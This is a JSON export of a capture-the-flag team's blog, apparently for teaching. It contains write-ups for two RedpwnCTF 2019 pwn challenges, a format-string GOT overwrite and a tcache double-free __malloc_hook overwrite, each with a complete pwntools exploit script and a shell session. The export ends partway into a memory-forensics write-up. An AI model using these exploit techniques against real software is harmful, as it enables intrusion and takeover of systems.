{"meta":{"title":"TEAMROCKETIST","subtitle":null,"description":"ctf team teamrocketist","author":"TEAMROCKETIST","url":"https://teamrocketist.github.io"},"pages":[{"title":"404 Not Found","date":"2018-10-24T23:21:04.870Z","updated":"2018-10-24T23:21:04.870Z","comments":false,"path":"/404.html","permalink":"https://teamrocketist.github.io//404.html","excerpt":"","text":""},{"title":"About","date":"2018-11-15T16:13:15.320Z","updated":"2018-11-15T16:13:15.320Z","comments":false,"path":"about/index.html","permalink":"https://teamrocketist.github.io/about/index.html","excerpt":"","text":"CTFs are a great way to learn hacking, they can be very challenging and teach you a lot of new skills they require a lot of work and dedication, but are highly rewarding. Who are we?TeamRocketIST is a security team founded in August of 2017, we represent IST (Instituto Superior Técnico).We seek to improve our skills in the cybersecurity world and represent our institution by elevating it to the highest level, at the moment the team consists of only members of the taguspark campus."},{"title":"Categories","date":"2018-10-24T23:21:04.874Z","updated":"2018-10-24T23:21:04.874Z","comments":false,"path":"categories/index.html","permalink":"https://teamrocketist.github.io/categories/index.html","excerpt":"","text":""},{"title":"Competitions","date":"2018-10-24T23:21:04.890Z","updated":"2018-10-24T23:21:04.890Z","comments":true,"path":"competitions/index.html","permalink":"https://teamrocketist.github.io/competitions/index.html","excerpt":"","text":""},{"title":"Links","date":"2018-10-24T23:21:04.874Z","updated":"2018-10-24T23:21:04.874Z","comments":true,"path":"links/index.html","permalink":"https://teamrocketist.github.io/links/index.html","excerpt":"","text":""},{"title":"Repository","date":"2018-10-24T23:21:04.874Z","updated":"2018-10-24T23:21:04.874Z","comments":false,"path":"repository/index.html","permalink":"https://teamrocketist.github.io/repository/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-10-24T23:21:04.874Z","updated":"2018-10-24T23:21:04.874Z","comments":false,"path":"tags/index.html","permalink":"https://teamrocketist.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"[Pwn] RedpwnCTF - Black Echo","slug":"Pwn-RedpwnCTF-Black-Echo","date":"2019-08-17T05:12:40.000Z","updated":"2019-08-17T05:30:00.462Z","comments":true,"path":"2019/08/17/Pwn-RedpwnCTF-Black-Echo/","link":"","permalink":"https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/","excerpt":"","text":"Black Echo Description:413 Written by: blevy You are trapped in a pitch-black cave with no food, water, flashlight, or self-esteem. A faint echo can be heard in the distance. nc chall2.2019.redpwn.net 4007 IntroductionNo binary was provided in this challenge, but it was easy to note that there was a format string vulnerability: 123$ nc chall2.2019.redpwn.net 4007%p0x1000 Without the binary we can’t get the got addresses required to leak libc, but we can get the binary from memory, I used an old x86 binary from a previous challenge to check what was the default address: 1234567891011121314151617181920pwndbg&gt; info proc mappings process 26806Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /ctf/redpwn/hardmode/hardmode 0x8049000 0x804a000 0x1000 0x0 /ctf/redpwn/hardmode/hardmode 0x804a000 0x804b000 0x1000 0x1000 /ctf/redpwn/hardmode/hardmode 0xf7db4000 0xf7f8b000 0x1d7000 0x0 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8b000 0xf7f8c000 0x1000 0x1d7000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8c000 0xf7f8e000 0x2000 0x1d7000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8e000 0xf7f8f000 0x1000 0x1d9000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8f000 0xf7f92000 0x3000 0x0 0xf7fcd000 0xf7fcf000 0x2000 0x0 0xf7fcf000 0xf7fd2000 0x3000 0x0 [vvar] 0xf7fd2000 0xf7fd4000 0x2000 0x0 [vdso] 0xf7fd4000 0xf7ffb000 0x27000 0x0 /lib/i386-linux-gnu/ld-2.28.so 0xf7ffc000 0xf7ffd000 0x1000 0x27000 /lib/i386-linux-gnu/ld-2.28.so 0xf7ffd000 0xf7ffe000 0x1000 0x28000 /lib/i386-linux-gnu/ld-2.28.so 0xfffdd000 0xffffe000 0x21000 0x0 [stack] We can start leaking from 0x8049000 until 0x804b000, the starting of 0x8048000-0x8049000 is just a repetition from 0x8049000-0x804a000, there is also something you should worry about, addresses that contains 0x0a (new line ‘\\n’) bytes can’t be leaked, because the function used to read is fgets and it stops reading when it encounters new lines, in this cases I just insert a null byte, in the end is expected the binary to be slightly corrupted. If you want more details liveoverflow did a video about an identical challenge on his youtube channel around 2017 you can visit at https://www.youtube.com/watch?v=XuzuFUGuQv0 The code to leak the binary:123456789101112131415161718192021222324252627282930binary = ''out = ''x=0x8049000while x &lt; 0x8049000+0x2000: address = \"0%x\" % x length = 0 print address if ('\\n' in binascii.unhexlify(address)): #length = 1 out = 'a' binary += '\\x00' else: r.sendline(\"%9$s\"+\"||||\"+p32(x)) out = r.recvuntil('||||') print out r.recv(timeout=1) print '-----' out = out.replace('||||','') #print out #length = count_until(out) if out == '': out = 'a' binary += '\\x00' else: binary += out with open('gotcha2.elf','wb+') as f: f.write(binary) x += len(out) They binary is somehow corrupted as expected but it’s still possible to deduce which libc addresses are in there, as you can see in the picture above, right above extern functions you have some libc addresses, they look like they are from the GOT, with some trial and error I manged to which they belong by using libc-database (https://github.com/niklasb/libc-database). First trying o find fgets: 12345678./find fgets 0xF7FCD918$ ./find fgets 0xF7FBDFE0$ ./find fgets 0xF7E54450$ ./find fgets 0xF7E38020$ ./find fgets 0xF7E4C620ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64) libc ID is libc6-i386_2.23-0ubuntu10_amd64, we now know which libc is and fgets got address is 0x804A014: Doing the same thing for printf you would end up finding the same: 12345./find printf 0xF7E38020archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64) Printf got address is 0x804a010: Now it’s a matter of leaking libc by leaking fgets from GOT and overwriting got address of printf into system with format string: 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *import timeimport binasciilibc = ELF('libc.so.6')host,port = 'chall.2019.redpwn.net','4007'r = remote(host,port)FGETS_GOT = 0x804A014PRINTF_GOT = 0x804A010r.sendline(\"%8$s\"+p32(PRINTF_GOT))PRINTF = u32(r.recv(4))LIBC_BASE = PRINTF - libc.symbols['printf']SYSTEM = LIBC_BASE + libc.symbols['system']FGETS = LIBC_BASE + libc.symbols['fgets']GETS = LIBC_BASE + libc.symbols['gets']PUTS = LIBC_BASE + libc.symbols['puts']log.info(\"LIBCBASE 0x%x\"%LIBC_BASE)log.info(\"PRINTF 0x%x\"%PRINTF)log.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"FGETS 0x%x\"%FGETS)log.info(\"STDOUT 0x%x\"%(LIBC_BASE+libc.symbols['stdout']))log.info(\"STDIN 0x%x\"%(LIBC_BASE+libc.symbols['stdin']))log.info(\"SETBUFF 0x%x\"%(LIBC_BASE+libc.symbols['setbuf']))log.info(\"STDERR 0x%x\"%(LIBC_BASE+libc.symbols['stderr']))log.info(\"PUTS 0x%x\"%(LIBC_BASE+libc.symbols['puts']))#SYSTEM = 0xcafebabeFLAG_LOW = SYSTEM &amp; 0xffffFLAG_HIGH = (SYSTEM &amp; 0xffff0000) &gt;&gt; 16s = ''s += p32(PRINTF_GOT)s += p32(PRINTF_GOT+2)s += '%7$ln' # clears the already existing got addresss += '%&#123;&#125;x%7$hn'.format(FLAG_LOW-0x8)s += '%&#123;&#125;x%8$hn'.format(FLAG_HIGH-FLAG_LOW)r.sendline(s)r.recv()r.sendline(\"/bin/sh\\x00\")r.interactive() Running it: 12345678910111213141516171819202122$ python blackecho.py [*] '/ctf/work/blackecho/libc.so.6' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to chall2.2019.redpwn.net on port 4007: Done[*] LIBCBASE 0xf7dec000[*] PRINTF 0xf7e35020[*] SYSTEM 0xf7e26940[*] FGETS 0xf7e49620[*] STDOUT 0xf7f9cdfc[*] STDIN 0xf7f9ce00[*] SETBUFF 0xf7e51450[*] STDERR 0xf7f9cdf8[*] PUTS 0xf7e4b140[*] Switching to interactive mode\\x10\\xa0\\x0\\x12\\xa0\\x0...truncated...$ cat flag.txtflag&#123;__xXxxXx__w3lc0me_t0_th3_surf4c3__xXxxXx__&#125; The flag was flag{xXxxXxw3lc0me_t0_th3_surf4c3__xXxxXx__}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Format String","slug":"Pwn/x86/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"redpwnctf2017","slug":"redpwnctf2017","permalink":"https://teamrocketist.github.io/tags/redpwnctf2017/"}]},{"title":"[Pwn] RedpwnCTF - penpal world","slug":"Pwn-RedpwnCTF-penpal-world","date":"2019-08-17T03:16:39.000Z","updated":"2019-08-20T08:47:18.707Z","comments":true,"path":"2019/08/17/Pwn-RedpwnCTF-penpal-world/","link":"","permalink":"https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/","excerpt":"","text":"penpal world Description:436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010penpal_worldlibc-2.27.so IntroductionFrom the challenge is provided its binary and libc.Lets first extract some information: 12$ file penpal_worldpenpal_world: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped With file command we now know: ELF compiled for x86_x64 architecture. Dynamically linked. Not stripped. Let’s check the enabled protections with checksec: 1234567$ checksec penpal_world[*] '/ctf/redpwn/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Protections: FULL RELRO (GOT entries are read only we can’t overwrite them) STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it) The Stack is not executable (We can’t execute shellcode techniques like ROP can bypass this) PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address) Running the binaryLets first run the binary to see how it works We are presented with a menu where we can create,edit,discard and read a postcard:123456$ ./penpal_worldOPTIONS1) Create a postcard2) Edit a postcard3) Discard a postcard4) Read a postcard Analysing the binary for a vulnerabilityUsing ida to check on the main loop: Lets check create_card:edit_card time:The vulnerability is in discard_card:display function doesn’t have anything special it does control the indexes and you can print the cards as well. ExploitFirst we need to check which libc version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using libc-2.27 since version 2.26 it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist. Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins. The good thing about this unlike normal chunks and luckly in this libc version there is no security checks making it easier to exploit. Thus we can double free and malloc without any size checks. The exploit plan is the following one: Leak the heap address by reading the fd pointer after freeing; Find a way to overwrite the size of a chunk to 0x91 (so when we free it it goes to unsorted bin instead); Fill the tcache unsorted tcache bin list (max 7); After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc; Tricking malloc() into returning the address of __malloc_hook ; Overwrite __malloc_hook with the address of a one gadget ; Trigger the hook using malloc()! Setting up the environment for pwn ctf challengesNow there is a small problem, if you want to debug the binary with the right libc version you either find the right linux docker container that uses that version that libc as default or you LD_PRELOAD it, to do it you need to compile that specific version. for example to do this manually: 123cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.sopatchelf --set-interpreter /tmp/ld-2.27.so ./testLD_PRELOAD=./libc.so.6 ./test Or using pwntools 12from pwn import *p = process([\"/path/to/ld.so\", \"./test\"], env=&#123;\"LD_PRELOAD\":\"/path/to/libc.so.6\"&#125;) Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is libc-2.27.so the one we need. The github link: https://github.com/skysider/pwndockerThe docker hub link: https://hub.docker.com/r/skysider/pwndocker I don’t recommend going with the LD_PRELOAD way, sure you can debug it with the right version but remember this, some offsets when leaking libc will be different from the server ones because you’re preloading it with the ld.so, if you choose to go this way remember to adapt those offsets to the right ones. Leak heap addressThis the structure of of a chunk:123456789101112+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start| PREV_SIZE OR USER DATA |+---------------------------------+-+-+-+| CHUNK SIZE |A|M|P|+---------------------------------+-+-+-+ | FORWARD POINTER(FD) | &lt;-- All freechunks| BACK POINTER(BK) | &lt;-- normalchunk or larger| NEXT BIGGER POINTER (fd_nextsize) | &lt;-- Only if largechunk| PREVIOUS SMALLER PTR(bk_nextsize) | &lt;-- Only if largechunk| - - - - - - - - - - - - - | &lt;-- End of this chunk.| PREV_SIZE |+---------------------------------------+ The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is free()‘d, it sets its FD pointer to NULL because there wasn’t any freed item yet, if we free a second item the FD pointer will be set to the previous chunk freed, by using UAF vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this. Some introductory stuff we can add I’m using pwntools which is a very handy framework for pwn you can find it at https://github.com/Gallopsled/pwntools 1234567891011121314from pwn import *host, port = \"chall2.2019.redpwn.net\", \"4010\"filename = \"./penpal_world\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port) Since PIE is enabled we need to get its base address, to debug it in gdb we can use this function to do it: 123def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16) If you’re LD_PRELOAD the libc version you need to change the index of memory_map to 5: 123def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[5].split(\"-\")[0],16) If you’re using gdb.attach from pwntools and you’re inside a docker container remember it won’t detect the terminal to open the specific gdb window, we can use tmux for example but we need to specified it by doing this: 1234context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xb11]) Open two windows logged in the docker container, the 1st one run your script and on the 2nd one open tmux, when running the script gdb will automaticity open with the specified breakpoints we set in the debug list: Now that we can debug and open gdb in a very easy way it’s time to write the functions to add,free,edit and print: 12345678910111213141516def add(index): r.sendlineafter('4) Read a postcard\\n',str(1)) r.sendlineafter('Which envelope #?\\n', str(index))def edit(index, content): r.sendlineafter('4) Read a postcard\\n',str(2)) r.sendlineafter('Which envelope #?\\n', str(index)) r.sendafter('Write.\\n', content)def free(index): r.sendlineafter('4) Read a postcard\\n',str(3)) r.sendlineafter('Which envelope #?\\n', str(index))def read(index): r.sendlineafter('4) Read a postcard\\n',str(4)) r.sendlineafter('Which envelope #?\\n', str(index)) To leak an address we can for example allocate a chunk and then double free it, we then proceed to read its fd pointer which will point to the first freed chunk, this chunks will be inserted into a tcache bin due to its size of 0x48. Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:123456add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPr.interactive() Gdb output: Now let’s take a look after the 1st free: Lets check how tcache fast bin list is looking by using tcachebins on pwngdb: After 2nd free (Double free) Lets check again how tcache bin list is looking by using tcachebins on pwngdb: Now if we read the card at index 0 we will get a heap leak! 1234567add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60log.info('0x%x'%heap) Results:12345678910111213141516$ python test.py[*] '/ctf/work/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/lib/x86_64-linux-gnu/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Starting local process './penpal_world': pid 2596[*] 0x55d9117e3200[*] Stopped process './penpal_world' (pid 2596) LEAKING LIBCWe can only do mallocs of size 0x48, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it. Perhaps since this version of libc uses tcache, at every chunk bellow 0x410 are treated as it was a fastbin chunk even if we free a 0x91 chunk we will not get a libc address, luckily there is a limit to the tcache which is 7 we need to fill a tcache bin of size 0x91, we can do it by freeing that chunk 7 times the 8th time will be treated as an unsorted bin updating both fd and bk pointers into libc addresses. But to overwrite the size of a chunk we need to use the tcache poisoning attack you can find an example here. In the end we want malloc to return an arbitrary address where we can start writing stuff into an address that is able to overwrite the size of 0x51 to 0x91, when malloc executes it will try to find a chunk in the tcache bin of that size so it can reuse the same space in memory from previous freed chunks, if we modify the fd pointer with UAF, malloc will instead return the pointer we modified getting us an arbitrary write. First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this: The code to overwrite the size would look like this:12345678910111213add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60edit(0,p64(heap+0x90)) # change the fd pointer to get arbitrary write with mallocadd(0) # MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0add(1) # MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0add(0) # NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunkedit(0, 'B'*0x30 + p64(0x0)+ p64(0x51))free(0)edit(1,p64(0)+p64(0x91)+p64(0)+p64(0x91)) # OVERWRITES THE SIZE OF CHUNK 'B' After changing the FD with edit we need to do two mallocs until we get the right pointer, because on the first two frees the single linked list of the tcache chunks(0x50) is like this: 1heap+0x60 -&gt; heap+0x60 &lt;- 0x0 After editing the FD with heap+0x90 we get this: 1heap+0x60 -&gt; heap+0x90 &lt;- 0x0 The list after the first malloc:1heap+0x90 &lt;- 0x0 The list after the second malloc:10x0 (empty) The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times. Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from int_free, since it isn’t a tcache bin we need to worry about that. The size field of the next chunk should correspond to the size that has overwritten the size of chunk B and with a valid size with its flag prev_in_use set to 1. The lowest bit of size is the prev_in_use flag, 0x51 represented in binary is 01010001, the lowest bit is set to one. PREV_INUSE, records whether the previous chunk is allocated. In general, the P bit of the size field of the first allocated memory block in the heap is set to 1 to prevent access to the previous illegal memory. When the P bit of the size of a chunk is 0, we can get the size and address of the previous chunk through the prev_size field. The Chunk C is for this security check https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280 The Chunk D is to prevent going into unlink at https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303 : if we set nextinuse into 1 we won’t get an error at https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405 because we don’t even enter at unlink One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the prev_in_use of the fake chunk at chunk D uses function inuse_bit_at_offset which uses the size of previous 0x50(variable s) to find chunks D prev_in_use. 123456789add(1)edit(1,('C'*0x30 +p64(0x0)+p64(0x51))) # TO PREVENT double free or corruption (!prev)add(1) edit(1, ('D'*0x30+p64(0x0)+p64(0x01))) # TO PREVENT corrupted size vs. prev_size (as long as prev_in_use is set any values work (0x1,0x51,0x61 etc..)for i in range(7): # Filling tcachebin free(0)free(0) # free unsortedbinread(0) # LEAK LIBCl = u64(r.recv(6).ljust(8,'\\x00')) Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees: Now the 8th free which is the unsorted bin: Overwrite __malloc_hook with the address of a one gadgetMalloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using TCACHE POISONING we can overwrite its address with the address of onegadget. Getting a free shell after triggering malloc. Getting the onegadget offset using https://github.com/david942j/one_gadget 123456789101112one_gadget libc-2.27.so 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)constraints: rcx == NULL0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL The offset that works with the restriction is 0x10a38c.Making malloc to return the address of __malloc_hook and overwriting it with onegadget: 123456789101112131415LIBC_BASE = l-0x3ebca0MALLOC_HOOK = LIBC_BASE+libc.symbols['__malloc_hook']FREE_HOOK = LIBC_BASE+libc.symbols['__free_hook']ONE_GADGET = LIBC_BASE+0x10a38c############################################################################################ OVERWRITE MALLOC_HOOKfree(1)edit(1,p64(MALLOC_HOOK)) # change the address of FD to MALLOC_HOOKadd(0)add(0) # returns the address of malloc_hookedit(0,p64(ONE_GADGET)) # Overwrites content of malloc_hook to ONE_GADGETadd(0) # trigers malloc hook#########################################################r.interactive() The full exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *host, port = \"chall2.2019.redpwn.net\", \"4010\"filename = \"./penpal_world\"elf = ELF(filename)context.arch = 'amd64'#libc = ELF('/glibc/2.27/64/lib/libc.so.6')if not args.REMOTE: libc = elf.libc#ELF('/glibc/2.27/64/lib/libc-2.27.so')else: libc = ELF('./libc-2.27.so')#rop=ROP([libc])def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): #bp = [0xea0,0xd31,0xc52] #bp = [0x00000dfb,0x00000b7c,0x00000d10] script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def add(index): r.sendlineafter('4) Read a postcard\\n',str(1)) r.sendlineafter('Which envelope #?\\n', str(index)) #r.sendlineafter()def edit(index, content): r.sendlineafter('4) Read a postcard\\n',str(2)) r.sendlineafter('Which envelope #?\\n', str(index)) r.sendafter('Write.\\n', content)def free(index): r.sendlineafter('4) Read a postcard\\n',str(3)) r.sendlineafter('Which envelope #?\\n', str(index)) #r.recvuntil('Command me: ')def read(index): r.sendlineafter('4) Read a postcard\\n',str(4)) r.sendlineafter('Which envelope #?\\n', str(index))context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xb11,0x9b3])#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c####################################### LEAK FUCKING LIBCadd(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60log.info('0x%x'%heap)log.info('0x%x'%(heap+0x100))edit(0,p64(heap+0x90)) # change the fd pointer to get arbitrary write with mallocadd(0) # MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0add(1) # MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0add(0) # NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNKedit(0, 'B'*0x30 + p64(0x0)+ p64(0x51))edit(1,p64(0)+p64(0x91)+p64(0)+p64(0x91)) # OVERWRITES THE SIZE OF CHUNK 'B'add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BINedit(1,('C'*0x30 +p64(0x0)+p64(0x51)))add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BINedit(1, ('D'*0x30+p64(0x0)+p64(0x51)))for i in range(7): # Filling tcachebin free(0)free(0) # free unsortedbinread(0) # LEAK LIBCl = u64(r.recv(6).ljust(8,'\\x00'))#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))LIBC_BASE = l-0x3ebca0MALLOC_HOOK = LIBC_BASE+libc.symbols['__malloc_hook']FREE_HOOK = LIBC_BASE+libc.symbols['__free_hook']SYSTEM = LIBC_BASE+ libc.symbols['system']BINSH = LIBC_BASE+ libc.search('/bin/sh').next()ONE_GADGET = LIBC_BASE+0x10a38cPOPRDI = LIBC_BASE+0x2155f # pop rdi ; retlog.info(\"MAIN ARENA+0x96 0x%x\"%l)log.info(\"LIBCBASE 0x%x\"%LIBC_BASE)log.info(\"ONEGADGET 0x%x\"%ONE_GADGET)log.info(\"MALLOC HOOK 0x%x\"%MALLOC_HOOK)log.info(\"FREE HOOK 0x%x\"%FREE_HOOK)log.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"BIN_SH 0x%x\"%BINSH)log.info(\"POP RDI 0x%x\"%POPRDI)log.info(\"JUMP 0x%x\"%(heap+0x150))#0x1d8b6b0))log.info(\"HEAP 0x%x\"%(heap)) #24log.info(\"NEXT HEAP 0x%x\"%(heap+0x130))############################################################################################ OVERWRITE MALLOC_HOOKfree(1)edit(1,p64(MALLOC_HOOK)) # change the address of FD to MALLOC_HOOKadd(0)add(0) # returns the address of malloc_hookedit(0,p64(ONE_GADGET)) # Overwrites content of malloc_hook to ONE_GADGETadd(0) # trigers malloc hook#########################################################r.interactive() Running it 123456789101112131415161718192021222324252627282930$ root@redpwn:/ctf/work/pwn/pepal_world# python penpal_world.py REMOTE[*] '/ctf/work/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/pepal_world/libc-2.27.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to chall2.2019.redpwn.net on port 4010: Done[*] 0x561de3031200[*] 0x561de3031300[*] MAIN ARENA+0x96 0x7f79a7fe2ca0[*] LIBCBASE 0x7f79a7bf7000[*] ONEGADGET 0x7f79a7d0138c[*] MALLOC HOOK 0x7f79a7fe2c30[*] FREE HOOK 0x7f79a7fe48e8[*] SYSTEM 0x7f79a7c46440[*] BIN_SH 0x7f79a7daae9a[*] POP RDI 0x7f79a7c1855f[*] JUMP 0x561de3031350[*] HEAP 0x561de3031200[*] NEXT HEAP 0x561de3031330[*] Switching to interactive mode$ cat flag.txtflag&#123;0h_n0e5_sW1p3r_d1D_5w!peEEeE&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Use After Free","slug":"Pwn/x64/Glibc-Malloc/Use-After-Free","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Use-After-Free/"}],"tags":[{"name":"redpwnctf2017","slug":"redpwnctf2017","permalink":"https://teamrocketist.github.io/tags/redpwnctf2017/"},{"name":"double_free","slug":"double-free","permalink":"https://teamrocketist.github.io/tags/double-free/"},{"name":"tcache_poisoning","slug":"tcache-poisoning","permalink":"https://teamrocketist.github.io/tags/tcache-poisoning/"},{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"use_after_free","slug":"use-after-free","permalink":"https://teamrocketist.github.io/tags/use-after-free/"}]},{"title":"[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag","slug":"Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag","date":"2019-07-27T15:31:43.000Z","updated":"2019-07-27T18:21:15.621Z","comments":true,"path":"2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/","link":"","permalink":"https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/","excerpt":"","text":"Hidden Flag 220 Description:Hidden Flag (Reverse, Hard, 220 pts) Author: Khanov Artur (awengar)Somebody hides flag in RAM. Catch itRaw dump: https://cybrics.net/files/20190717.zip.torrent I didn’t solve this challenge during the ctf, one of the main reasons was because the challenge was a mix of a forensics/reverse, I got stuck on the forensics part, mostly because I don’t have much experience looking at memory dumps, the reversing part was pretty easy after finding the “malicious” binary. Forensics partSo we start with a memdump and we somehow need to find the flag in memory, I used volatility for this part. The first thing we have to do is to find the most suitable profile for the dump, volatility has a command named imageinfo which can help us with that: 12345678910111213141516$ volatility -f 20190717.mem imageinfoVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win2016x64_14393, Win10x64_14393, Win10x64_16299, Win10x64_17134, Win10x64_15063 AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace 